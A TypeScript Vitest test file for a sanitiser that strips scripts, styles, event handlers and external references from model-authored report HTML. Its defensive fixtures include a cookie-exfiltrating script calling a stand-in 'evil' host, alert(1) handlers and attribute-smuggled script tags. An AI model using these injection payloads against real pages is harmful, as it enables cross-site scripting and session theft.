/**
 * The sanitiser for model-authored markup.
 *
 * This is the one place in the programme where a model's output reaches a
 * client document as *markup* rather than as a typed value, so every test here
 * hands it the thing it exists to refuse. A sanitiser asserted only on
 * well-formed input is a sanitiser nobody has run.
 *
 * The bargain it enforces: the model chooses structure, the design system
 * chooses appearance. Concretely — no `style`, no colour, no size, no font, no
 * reference to anything, and no class the stylesheet has not defined.
 */
import { describe, expect, it } from 'vitest';
import {
  ALLOWED_CLASSES,
  ALLOWED_TAGS,
  COMPOSE_JSON_SCHEMA,
  composePrompt,
  composedIsDesigned,
  htmlText,
  MAX_SHEET_CHARS,
  sanitiseComposedHtml,
} from '../composeHtml.pure';
import { buildReportCss } from '../../../../../supabase/functions/_shared/reportDesign/css.pure';
import { resolveReportPalette } from '../../../../../supabase/functions/_shared/reportDesign/brandResolve.pure';

const clean = (html: string) => sanitiseComposedHtml(html).html;

describe('what it refuses outright', () => {
  it('drops a script and its source, rather than unwrapping it', () => {
    // Unwrapping would paste the source into the document as visible text.
    const out = sanitiseComposedHtml(
      '<p>Before</p><script>fetch("//evil/"+document.cookie)</script><p>After</p>',
    );
    expect(out.html).toBe('<p>Before</p><p>After</p>');
    expect(out.html).not.toContain('fetch');
    expect(out.dropped).toContain('script');
  });

  it('drops a style block, which would otherwise redefine the design system', () => {
    const out = sanitiseComposedHtml('<style>.kpi-value{color:red}</style><p>Body</p>');
    expect(out.html).toBe('<p>Body</p>');
    expect(out.html).not.toContain('color');
  });

  it('refuses a style attribute, which is the whole point', () => {
    const out = sanitiseComposedHtml(
      '<div class="kpi" style="background:#8B7355;font-size:40pt">$856,932</div>',
    );
    expect(out.html).toBe('<div class="kpi">$856,932</div>');
    expect(out.dropped).toContain('@style');
  });

  it('lets nothing point at anything', () => {
    for (const markup of [
      '<img src="https://evil/x.png">',
      '<a href="https://evil/">Click</a>',
      '<iframe src="https://evil/"></iframe>',
      '<object data="x.swf"></object>',
      '<link rel="stylesheet" href="//evil/x.css">',
    ]) {
      const out = clean(markup);
      expect(out, markup).not.toContain('evil');
      expect(out, markup).not.toContain('src');
      expect(out, markup).not.toContain('href');
    }
  });

  it('strips an event handler even on an allowed tag', () => {
    const out = sanitiseComposedHtml('<div class="kpi" onclick="alert(1)">x</div>');
    expect(out.html).toBe('<div class="kpi">x</div>');
    expect(out.dropped).toContain('@onclick');
  });

  it('strips an id, which would collide with the renderer\'s own', () => {
    expect(clean('<div id="cv0" class="kpi">x</div>')).toBe('<div class="kpi">x</div>');
  });

  it('drops an svg whole rather than letting a chart in the back door', () => {
    // Charts arrive as blocks and are drawn by `charts.pure.ts`, which is the
    // only thing that knows the chart palette. An SVG here would be a chart in
    // colours nobody chose.
    const out = sanitiseComposedHtml('<p>A</p><svg><rect fill="#f00"/></svg><p>B</p>');
    expect(out.html).toBe('<p>A</p><p>B</p>');
    expect(out.html).not.toContain('#f00');
  });
});

describe('what it keeps', () => {
  it('keeps the design system\'s own vocabulary intact', () => {
    const composed = '<div class="grid-12">'
      + '<div class="col col-8"><div class="table-block"><table class="data">'
      + '<thead><tr><th>Source</th><th class="num">Annual</th></tr></thead>'
      + '<tbody><tr><th scope="row">Salary</th><td class="num">$180,000</td></tr>'
      + '<tr class="total"><th scope="row">Total</th><td class="num">$222,000</td></tr>'
      + '</tbody></table></div></div>'
      + '<div class="col col-4"><aside class="sidenote">'
      + '<span class="sidenote-label">Note</span><p>Shading applies.</p></aside></div></div>';
    const out = sanitiseComposedHtml(composed);
    expect(out.html).toBe(composed);
    expect(out.dropped).toEqual([]);
  });

  it('keeps the table semantics a tagged PDF needs', () => {
    const out = clean('<th scope="row" colspan="2">Total</th>');
    expect(out).toContain('scope="row"');
    expect(out).toContain('colspan="2"');
  });

  it('unwraps a disallowed tag rather than losing the client\'s words', () => {
    // Dropping a paragraph because it was tagged `<b>` loses content, which is
    // worse than losing its emphasis.
    expect(clean('<b>The maximum capacity is $856,932.</b>'))
      .toBe('The maximum capacity is $856,932.');
    expect(clean('<h1>Capacity</h1>')).toBe('Capacity');
  });

  it('filters a class list without dropping the element', () => {
    const out = sanitiseComposedHtml('<div class="kpi shadow-lg bg-amber-500">x</div>');
    expect(out.html).toBe('<div class="kpi">x</div>');
    expect(out.dropped).toEqual(expect.arrayContaining(['.shadow-lg', '.bg-amber-500']));
  });

  it('leaves an element with no surviving class as a bare tag', () => {
    expect(clean('<div class="flex gap-4">x</div>')).toBe('<div>x</div>');
  });
});

describe('the things a tokeniser gets wrong', () => {
  it('escapes a stray angle bracket instead of letting it open a tag', () => {
    const out = clean('<p>Capacity < $900,000 and > $800,000</p>');
    expect(out).toContain('&lt;');
    expect(out).toContain('&gt;');
    expect(out).toContain('<p>');
  });

  it('is not fooled by a quoted angle bracket inside an attribute', () => {
    const out = clean('<div class="kpi" title="a > b">value</div>');
    expect(out).toBe('<div class="kpi">value</div>');
  });

  it('is not fooled by a script tag written across an attribute boundary', () => {
    const out = clean('<div class="kpi" data-x="<script>alert(1)</script>">v</div>');
    expect(out).not.toContain('alert');
  });

  it('drops the tail of an unclosed skipped tag rather than leaking it', () => {
    // `<script>` with no close: everything after it is source, not content.
    const out = clean('<p>Kept</p><script>var x = 1;');
    expect(out).toBe('<p>Kept</p>');
  });

  it('escapes a bare ampersand but keeps a real entity', () => {
    const out = clean('<p>Fish & chips &amp; more &nbsp; end</p>');
    expect(out).toContain('&amp; chips');
    expect(out).toContain('&amp; more');
    expect(out).toContain('&nbsp;');
  });

  it('closes a br rather than leaving it open', () => {
    expect(clean('<p>a<br>b</p>')).toBe('<p>a<br />b</p>');
  });

  it('caps a sheet longer than a page can be', () => {
    const huge = `<p>${'x'.repeat(MAX_SHEET_CHARS * 2)}</p>`;
    expect(sanitiseComposedHtml(huge).html.length).toBeLessThanOrEqual(MAX_SHEET_CHARS + 16);
  });

  it('never throws, whatever it is handed', () => {
    for (const bad of [null, undefined, 42, {}, [], '<<<>>>', '<div class=', '</p></p>', '<a<b>c']) {
      expect(() => sanitiseComposedHtml(bad as never), String(bad)).not.toThrow();
    }
  });
});

describe('the vocabulary is real', () => {
  it('names only classes the stylesheet actually defines', () => {
    // A class here the stylesheet does not define renders as unstyled markup —
    // the model would be composing with a component that does not exist.
    const css = buildReportCss({
      palette: resolveReportPalette({ preset: 'signature', brandHex: '#D9A520' }),
      options: { surfaceStyle: 'raised' },
      masthead: 'Harbour & Vale',
    });
    for (const cls of ALLOWED_CLASSES) {
      expect(css, cls).toContain(`.${cls}`);
    }
  });

  it('offers no tag that could carry a reference', () => {
    for (const tag of ['img', 'a', 'iframe', 'script', 'style', 'svg', 'video', 'source']) {
      expect(ALLOWED_TAGS, tag).not.toContain(tag);
    }
  });

  it('teaches the model the vocabulary it is actually allowed', () => {
    const p = composePrompt('Capacity at a glance', 'Rate 9.44%.', 'Use the same words.', 'Lock the figures.');
    expect(p).toContain('grid-12');
    expect(p).toContain('kpi-strip');
    expect(p).toContain('tone-caution');
    // And is blunt about the boundary, because a model that writes a style
    // attribute has wasted a call.
    expect(p).toContain('No style attribute');
    expect(p).toContain('Fill the page');
    expect(p).toContain('Lock the figures.');
  });

  it('asks for sheets, which is what makes it composition rather than a stream', () => {
    expect(COMPOSE_JSON_SCHEMA.properties.sheets.items.required).toContain('html');
    expect(COMPOSE_JSON_SCHEMA.properties.sheets.description).toContain('One entry per printed page');
  });
});

describe('the text a sheet will print', () => {
  it('is everything on the page, so the figure check sees all of it', () => {
    // Stronger than the typed-block equivalent: `enrichedText` is a switch
    // somebody has to remember to extend, and this is by construction whatever
    // reaches the page.
    const text = htmlText(
      '<div class="kpi-strip"><div class="kpi"><div class="kpi-label">RATE</div>'
      + '<div class="kpi-value">9.44%</div></div></div><p>Capacity $856,932.</p>',
    );
    expect(text).toBe('RATE 9.44% Capacity $856,932.');
  });

  it('does not read a dropped tag\'s contents as text', () => {
    expect(htmlText('<p>Real</p><script>var secret = 1;</script>')).toBe('Real');
  });

  it('unescapes entities, so an escaped figure is still a figure', () => {
    expect(htmlText('<p>Capacity &lt; $900,000 &amp; rising</p>'))
      .toBe('Capacity < $900,000 & rising');
  });
});

describe('did it actually compose anything', () => {
  it('accepts a sheet that used the design system', () => {
    expect(composedIsDesigned('<div class="kpi-strip"><div class="kpi">x</div></div>')).toBe(true);
    expect(composedIsDesigned('<div class="grid-12"><div class="col col-4">x</div></div>')).toBe(true);
  });

  it('refuses a stack of paragraphs, which is what this replaces', () => {
    // A model asked for a laid-out page can satisfy the letter of the request
    // with three `<p>`s. That is the flat output the whole feature exists to
    // stop producing.
    expect(composedIsDesigned('<p>One.</p><p>Two.</p><p>Three.</p>')).toBe(false);
  });
});
